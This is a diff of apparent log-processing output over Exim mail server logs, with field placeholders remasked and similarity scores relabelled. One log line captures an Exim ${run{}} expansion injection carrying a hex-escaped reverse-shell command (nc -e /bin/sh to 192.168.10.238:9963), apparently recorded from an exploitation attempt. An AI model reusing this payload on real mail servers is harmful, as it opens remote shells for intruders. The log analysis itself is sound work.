@@ -1,18 +1,20 @@
-1j[*]-000[*]-[*] <= [*]@mail.cup.com U=www-data P=local S=[*] id=20200[*].Horde.[*]@mail.cup.com
-1j[*]-000[*]-[*] => [*] <[*]@mail.cup.com> R=local_user T=mail_spool
-1j[*]-000[*]-[*] Completed
-[*] queue run: pid=[*]
-1j[*]-000[*]-[*] [*]=[*] [*]root@mail.cup.com[*] [*]=[*]root [*]=[*]a[*]
-1j[*]-000[*]-[*] => /var/mail/mail [*]r[*]o[*]o[*]t[*]@mail.cup.com> R=mail4root T=address_file
+1j§-000§-§ <= §@mail.cup.com U=www-data P=local S=§ id=20200§.Horde.§@mail.cup.com
+1j§-000§-§ => § <§@mail.cup.com> R=local_user T=mail_spool
+1j§-000§-§ Completed
+§ queue run: pid=§
+1j§-000§-§ §=§ §root@mail.cup.com§ §=§root §=§a§
+1j§-000§-§ => /var/mail/mail §r§o§o§t§@mail.cup.com> R=mail4root T=address_file
 no host name found for IP address 192.168.10.238
-VRFY failed for [*]@cup.com H=(x) [192.168.10.238]
+VRFY failed for §@cup.com H=(x) [192.168.10.238]
 1j9ZoZ-0002Jk-9W <= <> H=localhost [127.0.0.1] P=smtp S=704
 1j9ZoZ-0002Jk-9W ** ${run{\x2fbin\x2fsh\t-c\t\x22nc\t-e\t\x2fbin\x2fsh\t192.168.10.238\t9963\x22}}@localhost: Too many "Received" headers - suspected mail loop
 1j9ZqV-0002Lc-DY <= <> R=1j9ZoZ-0002Jk-9W U=Debian-exim P=local S=650
-1j9ZoZ-0002Jk-9W [*]e[*]e[*]i[*] [*]r[*]o[*]e[*]
+1j9ZoZ-0002Jk-9W §e§e§i§ §r§o§e§
 
 
-Total time: 0.879106s
-Similarity 1: 79.06234%
+Total time: 0.500517s
+
+Overall scores:
+Sim-Score: 79.06234%
 Similarity 2: 65.30849%
-Idle state after: 54.73965%
+Template stable after processing 54.73965%
